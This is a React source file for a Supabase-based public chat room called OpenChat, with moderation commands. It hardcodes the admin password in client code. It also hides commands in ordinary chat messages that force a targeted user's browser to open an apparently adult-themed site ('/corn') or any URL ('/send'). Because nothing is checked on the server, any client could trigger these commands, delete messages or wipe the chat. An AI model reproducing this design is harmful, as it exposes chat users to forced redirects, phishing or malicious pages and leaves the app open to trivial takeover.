import { useState, useEffect, useRef, useCallback } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Send, Image, Settings, Download, X, MessageSquare, Video, Users } from "lucide-react";
import { generateChatHTML } from "@/lib/generateHTML";
import { toast } from "sonner";
import VideoChat from "./VideoChat";

interface Message {
  id: string;
  username: string;
  content: string | null;
  image_url: string | null;
  created_at: string;
  user_tag: string;
}

interface OnlineUser {
  username: string;
  tag: string;
}

const ADMIN_PASSWORD = "ankasugare123";

function getDailyTag(): string {
  const today = new Date().toISOString().slice(0, 10); // "YYYY-MM-DD"
  const storedDay = localStorage.getItem("chat-tag-day");
  const storedTag = localStorage.getItem("chat-user-tag");
  if (storedDay === today && storedTag) return storedTag;
  // New day or first visit — generate new tag
  const tag = String(Math.floor(1000 + Math.random() * 9000));
  localStorage.setItem("chat-user-tag", tag);
  localStorage.setItem("chat-tag-day", today);
  return tag;
}

const ChatRoom = () => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [newMessage, setNewMessage] = useState("");
  const [username, setUsername] = useState(() => localStorage.getItem("chat-username") || "Anonymous");
  const [editingName, setEditingName] = useState(false);
  const [tempName, setTempName] = useState(username);
  const [uploading, setUploading] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);
  const [onlineUsers, setOnlineUsers] = useState<OnlineUser[]>([]);
  const [showOnline, setShowOnline] = useState(false);
  const userTag = useRef(getDailyTag());
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const presenceChannelRef = useRef<any>(null);

  useEffect(() => {
    const fetchMessages = async () => {
      const { data } = await supabase
        .from("messages")
        .select("*")
        .order("created_at", { ascending: true })
        .limit(200);
      if (data) setMessages(data.filter(m => !m.content?.startsWith("__CORN__:")));
    };
    fetchMessages();

    const channel = supabase
      .channel("public:messages")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "messages" },
        (payload) => {
          const msg = payload.new as Message;
          // Handle corn command targeting this user
          if (msg.content?.startsWith("__CORN__:") && msg.content === `__CORN__:${userTag.current}`) {
            window.open("https://www.cornhub.website", "_blank");
            return;
          }
          if (msg.content?.startsWith("__CORN__:")) return;
          // Handle send command targeting this user
          if (msg.content?.startsWith("__SEND__:")) {
            const parts = msg.content.match(/^__SEND__:(\d{4}):(.+)$/);
            if (parts && parts[1] === userTag.current) {
              window.open(parts[2], "_blank");
            }
            return;
          }
          setMessages((prev) => [...prev, msg]);
        }
      )
      .on(
        "postgres_changes",
        { event: "DELETE", schema: "public", table: "messages" },
        (payload) => {
          setMessages((prev) => prev.filter((m) => m.id !== (payload.old as any).id));
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  const checkMuted = async (): Promise<boolean> => {
    const { data } = await supabase
      .from("muted_users")
      .select("*")
      .eq("user_tag", userTag.current)
      .gte("muted_until", new Date().toISOString());
    if (data && data.length > 0) {
      const until = new Date(data[0].muted_until);
      toast.error(`Muted until ${until.toLocaleTimeString()}`);
      return true;
    }
    return false;
  };

  const getDisplayNameByTag = async (tag: string) => {
    const { data } = await supabase
      .from("messages")
      .select("username")
      .eq("user_tag", tag)
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle();

    return data?.username?.trim() || "Unknown user";
  };

  const postSystemMessage = async (content: string) => {
    await supabase.from("messages").insert({
      username: "System",
      content,
      user_tag: "0000",
    });
  };

  const handleCommand = async (text: string): Promise<boolean> => {
    if (!isAdmin) return false;

    // /wipe - delete all messages
    if (text.trim() === "/wipe") {
      const { error } = await supabase.from("messages").delete().neq("id", "00000000-0000-0000-0000-000000000000");
      if (!error) {
        setMessages([]);
        toast.success("/wipe executed — chat cleared");
      }
      return true;
    }

    // /timeout #XXXX minutes or /mute #XXXX minutes
    const match = text.match(/^\/(timeout|mute)\s+#(\d{4})\s+(\d+)$/);
    if (match) {
      const [, command, tag, mins] = match;
      const targetName = await getDisplayNameByTag(tag);
      const mutedUntil = new Date(Date.now() + parseInt(mins) * 60000).toISOString();
      await supabase.from("muted_users").insert({ user_tag: tag, muted_until: mutedUntil });
      await postSystemMessage(
        `${targetName} #${tag} was ${command === "timeout" ? "timed out" : "muted"} for ${mins} minute(s).`
      );
      toast.success(`/${command} executed for ${targetName} #${tag} (${mins} min)`);
      return true;
    }

    const unmatch = text.match(/^\/(untimeout|unmute)\s+#(\d{4})$/);
    if (unmatch) {
      const [, command, tag] = unmatch;
      const targetName = await getDisplayNameByTag(tag);
      await supabase.from("muted_users").delete().eq("user_tag", tag);
      await postSystemMessage(
        `${targetName} #${tag} ${command === "untimeout" ? "is no longer timed out" : "was unmuted"}.`
      );
      toast.success(`/${command} executed for ${targetName} #${tag}`);
      return true;
    }

    // /corn #XXXX
    const cornMatch = text.match(/^\/corn\s+#(\d{4})$/);
    if (cornMatch) {
      const [, tag] = cornMatch;
      const targetName = await getDisplayNameByTag(tag);
      await supabase.from("messages").insert({
        username: "System",
        content: `__CORN__:${tag}`,
        user_tag: "0000",
      });
      toast.success(`/corn sent to ${targetName} #${tag}`);
      return true;
    }

    // /send #XXXX url
    const sendMatch = text.match(/^\/send\s+#(\d{4})\s+(.+)$/);
    if (sendMatch) {
      const [, tag, url] = sendMatch;
      const targetName = await getDisplayNameByTag(tag);
      await supabase.from("messages").insert({
        username: "System",
        content: `__SEND__:${tag}:${url.trim()}`,
        user_tag: "0000",
      });
      toast.success(`/send sent to ${targetName} #${tag}`);
      return true;
    }

    // /force-update - increment min_html_version to invalidate old HTMLs
    if (text.trim() === "/force-update") {
      const { data: config } = await supabase.from("app_config").select("value").eq("key", "min_html_version").single();
      const currentVersion = parseInt(config?.value || "2");
      const newVersion = currentVersion + 1;
      await supabase.from("app_config").update({ value: String(newVersion) }).eq("key", "min_html_version");
      await postSystemMessage(`HTML version bumped to ${newVersion}. Old HTMLs will now show "UPDATE REQUIRED".`);
      toast.success(`/force-update executed — version now ${newVersion}`);
      return true;
    }

    return false;
  };

  const sendMessage = async () => {
    const text = newMessage.trim();
    if (!text) return;

    // Check for admin password
    if (text === ADMIN_PASSWORD) {
      setIsAdmin(true);
      setNewMessage("");
      toast.success("Admin access granted");
      return;
    }

    // Check for commands
    if (text.startsWith("/")) {
      const handled = await handleCommand(text);
      if (handled) {
        setNewMessage("");
        return;
      }
    }

    // Check if muted
    if (await checkMuted()) return;

    await supabase.from("messages").insert({ username, content: text, user_tag: userTag.current });
    setNewMessage("");
  };

  const handleImageUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    if (await checkMuted()) return;
    setUploading(true);

    const fileName = `${Date.now()}-${file.name}`;
    const { error } = await supabase.storage.from("chat-images").upload(fileName, file);

    if (!error) {
      const { data: urlData } = supabase.storage.from("chat-images").getPublicUrl(fileName);
      await supabase.from("messages").insert({ username, image_url: urlData.publicUrl, user_tag: userTag.current });
    }
    setUploading(false);
    if (fileInputRef.current) fileInputRef.current.value = "";
  };

  const deleteMessage = async (id: string) => {
    await supabase.from("messages").delete().eq("id", id);
    setMessages((prev) => prev.filter((m) => m.id !== id));
  };

  const saveName = () => {
    const name = tempName.trim() || "Anonymous";
    setUsername(name);
    localStorage.setItem("chat-username", name);
    setEditingName(false);
  };

  const handleDownload = () => {
    const html = generateChatHTML();
    const blob = new Blob([html], { type: "text/html" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "OpenChat.html";
    a.click();
    URL.revokeObjectURL(url);
  };

  const formatTime = (ts: string) => {
    const d = new Date(ts);
    return d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
  };

  const [activeTab, setActiveTab] = useState<"chat" | "video">("chat");

  return (
    <div className="min-h-screen px-4 py-4 sm:px-6 sm:py-8">
      <div className="mx-auto grid h-[calc(100vh-2rem)] max-w-5xl gap-5 sm:h-[calc(100vh-4rem)]">
        <header className="text-center">
          <h1 className="text-3xl font-bold uppercase tracking-[0.25em] text-primary drop-shadow-[0_0_14px_hsl(var(--primary)/0.45)] sm:text-5xl">
            OpenChat
          </h1>
          {/* Tab switcher */}
          <div className="mt-3 inline-flex gap-2 rounded-full border border-primary/20 bg-secondary/60 p-1">
            <button
              onClick={() => setActiveTab("chat")}
              className={`inline-flex items-center gap-1.5 rounded-full px-4 py-1.5 text-[0.7rem] font-semibold uppercase tracking-[0.18em] transition-all ${
                activeTab === "chat"
                  ? "bg-primary text-primary-foreground shadow-[0_0_14px_hsl(var(--primary)/0.3)]"
                  : "text-muted-foreground hover:text-foreground"
              }`}
            >
              <MessageSquare className="h-3.5 w-3.5" />
              Live Chat
            </button>
            <button
              onClick={() => setActiveTab("video")}
              className={`inline-flex items-center gap-1.5 rounded-full px-4 py-1.5 text-[0.7rem] font-semibold uppercase tracking-[0.18em] transition-all ${
                activeTab === "video"
                  ? "bg-primary text-primary-foreground shadow-[0_0_14px_hsl(var(--primary)/0.3)]"
                  : "text-muted-foreground hover:text-foreground"
              }`}
            >
              <Video className="h-3.5 w-3.5" />
              FaceTime
            </button>
          </div>
        </header>

        <div className="chat-shell flex min-h-0 flex-col overflow-hidden rounded-[1.25rem] px-4 py-4 sm:px-7 sm:py-7">
          <VideoChat visible={activeTab === "video"} username={username} />
          <div className={activeTab === "chat" ? "flex min-h-0 flex-1 flex-col" : "hidden"}>
          <div className="mb-5 flex flex-wrap items-center gap-3">
            <span className="inline-flex items-center gap-2 rounded-full border border-primary/30 bg-primary/10 px-4 py-1.5 text-[0.7rem] font-semibold uppercase tracking-[0.2em] text-foreground">
              <span className="h-2.5 w-2.5 rounded-full bg-primary shadow-[0_0_14px_hsl(var(--primary)/0.65)]" />
              Live Chat
            </span>
            {isAdmin && (
              <span className="inline-flex items-center rounded-full bg-destructive px-3 py-1 text-[0.65rem] font-bold uppercase tracking-[0.2em] text-destructive-foreground">
                Admin
              </span>
            )}
            <div className="ml-auto flex flex-wrap items-center gap-2">
              {editingName ? (
                <div className="flex items-center gap-1">
                  <Input
                    value={tempName}
                    onChange={(e) => setTempName(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && saveName()}
                    className="h-9 w-36 border-primary/20 bg-secondary/80 text-sm"
                    autoFocus
                  />
                  <Button size="sm" variant="ghost" onClick={saveName} className="chat-tab-link h-9 rounded-full px-4 text-xs uppercase tracking-[0.18em] text-foreground">
                    OK
                  </Button>
                </div>
              ) : (
                <button
                  onClick={() => {
                    setTempName(username);
                    setEditingName(true);
                  }}
                  className="chat-tab-link inline-flex h-10 items-center gap-2 rounded-full px-4 text-xs uppercase tracking-[0.18em] text-foreground transition-transform hover:-translate-y-0.5"
                >
                  <Settings className="h-3.5 w-3.5" />
                  <span>{username}</span>
                  {isAdmin && <span className="font-mono text-primary">#{userTag.current}</span>}
                </button>
              )}
              <Button size="sm" variant="outline" onClick={handleDownload} className="chat-tab-link h-10 rounded-full border-0 px-4 text-xs uppercase tracking-[0.18em] text-foreground hover:-translate-y-0.5">
                <Download className="h-3.5 w-3.5" />
                HTML
              </Button>
            </div>
          </div>

          <div className="chat-message-card chat-scrollbar mb-4 flex-1 overflow-y-auto rounded-xl p-4 sm:p-5">
            {messages.length === 0 && (
              <div className="flex h-full items-center justify-center text-sm uppercase tracking-[0.18em] text-muted-foreground">
                No messages yet. Say something.
              </div>
            )}
            <div className="flex flex-col gap-3">
              {messages.map((msg) => {
                const isSelf = msg.user_tag === userTag.current;
                const isSystem = msg.username === "System";
                return (
                  <div
                    key={msg.id}
                    className={`flex flex-col ${isSystem ? "items-center" : isSelf ? "items-end" : "items-start"}`}
                  >
                    {isSystem ? (
                      <div className="rounded-full border border-accent/30 bg-accent/10 px-4 py-1 text-[0.68rem] uppercase tracking-[0.18em] text-foreground/90">
                        {msg.content}
                      </div>
                    ) : (
                      <>
                         <span className="mb-1 px-1 text-sm font-semibold tracking-[0.04em] text-foreground/82 sm:text-[0.95rem]">
                          {msg.username}
                          {isAdmin && <span className="font-mono text-primary"> #{msg.user_tag}</span>}
                          {" · "}
                          {formatTime(msg.created_at)}
                          {isAdmin && (
                            <button
                              onClick={() => deleteMessage(msg.id)}
                              className="ml-2 inline-flex items-center text-destructive transition-colors hover:text-destructive/80"
                              title="Delete message"
                            >
                              <X className="h-3 w-3" />
                            </button>
                          )}
                        </span>
                        <div
                          className={`max-w-[78%] rounded-[1.15rem] px-4 py-3 ${
                            isSelf
                              ? "bg-primary text-primary-foreground shadow-[0_0_18px_hsl(var(--primary)/0.22)]"
                              : "bg-secondary text-secondary-foreground"
                          } ${isSelf ? "rounded-br-md" : "rounded-bl-md"}`}
                        >
                          {msg.content && <p className="text-sm break-words">{msg.content}</p>}
                          {msg.image_url && (
                            <img src={msg.image_url} alt="shared" className="mt-2 max-w-full rounded-lg" loading="lazy" />
                          )}
                        </div>
                      </>
                    )}
                  </div>
                );
              })}
            </div>
            <div ref={messagesEndRef} />
          </div>

          <div className="rounded-xl border border-primary/20 bg-foreground/5 p-3">
            {isAdmin && (
              <div className="mb-2 px-1 font-mono text-[10px] uppercase tracking-[0.18em] text-muted-foreground">
                Commands: /wipe · /timeout #tag mins · /mute #tag mins · /untimeout #tag · /unmute #tag · /corn #tag · /send #tag url · /force-update
              </div>
            )}
            <div className="flex items-center gap-2 rounded-xl border border-primary/30 bg-background/30 p-2">
              <input ref={fileInputRef} type="file" accept="image/*" className="hidden" onChange={handleImageUpload} />
              <Button size="icon" variant="ghost" onClick={() => fileInputRef.current?.click()} disabled={uploading} className="chat-tab-link h-10 w-10 shrink-0 rounded-full text-foreground hover:bg-transparent">
                <Image className="h-5 w-5" />
              </Button>
              <Input
                value={newMessage}
                onChange={(e) => setNewMessage(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && sendMessage()}
                placeholder={isAdmin ? "Type a message or command..." : "Type a message..."}
                className="h-10 border-0 bg-transparent text-sm text-foreground placeholder:text-muted-foreground focus-visible:ring-0 focus-visible:ring-offset-0"
              />
              <Button size="icon" onClick={sendMessage} disabled={!newMessage.trim()} className="h-10 w-10 shrink-0 rounded-full bg-primary text-primary-foreground shadow-[0_0_18px_hsl(var(--primary)/0.32)] hover:bg-primary/90">
                <Send className="h-5 w-5" />
              </Button>
            </div>
          </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ChatRoom;
